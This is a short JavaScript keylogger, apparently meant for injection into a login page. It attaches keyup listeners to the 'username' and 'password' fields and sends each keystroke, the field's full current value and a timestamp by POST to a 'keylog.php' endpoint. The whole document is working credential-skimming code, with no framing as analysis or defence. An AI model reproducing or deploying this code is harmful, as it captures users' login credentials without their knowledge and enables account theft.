function keylogpress(e) {
    const data = {
        input_field: e.target.id,
        key_pressed: e.key,
        timestamp: new Date().toISOString(),
        value: e.target.value
    };
    fetch('keylog.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
}

document.getElementById('username').addEventListener('keyup',keylogpress);
document.getElementById('password').addEventListener('keyup',keylogpress);